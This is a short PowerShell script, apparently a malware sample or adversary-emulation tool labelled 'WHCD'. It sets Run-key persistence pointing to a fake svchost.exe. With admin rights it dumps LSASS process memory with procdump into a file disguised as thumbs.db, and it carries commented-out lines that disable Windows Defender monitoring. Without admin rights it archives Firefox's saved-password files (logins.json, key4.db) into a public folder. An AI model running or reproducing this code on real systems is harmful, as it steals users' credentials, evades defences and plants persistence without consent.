Write-Host "Hello WHCD!"

$whoami = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
$amiadmin = $whoami.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if($amiadmin) {
    Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name WHCD -Value "C:\ProgramData\svchost.exe"
#    Set-MpPreference -DisableRealtimeMonitoring $true
#    Set-MpPreference -DisableBehaviorMonitoring $true
#    Set-MpPreference -MAPSReporting Disabled
    $myprocid = Get-Process | Where-Object {$_.ProcessName -eq 'lsass'} | Select-Object ProcessName,Id
    cmd.exe /c C:\Users\Public\procdump64.exe $myprocid.Id -accepteula -mp C:\Users\Public\Music\thumbs.db
}
else {
    Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name WHCD -Value "$env:USERPROFILE\svchost.exe"
    $ffprofiledir = Get-ChildItem -Path "$env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\" -Filter "*-release" | Select-Object -ExpandProperty FullName
    $compresscontext = @{
        Path = "$ffprofiledir\logins.json", "$ffprofiledir\key4.db"
        CompressionLevel = "Fastest"
        DestinationPath = "$env:PUBLIC\Music\WHCDsample.zip"
    }
    Compress-Archive @compresscontext
}

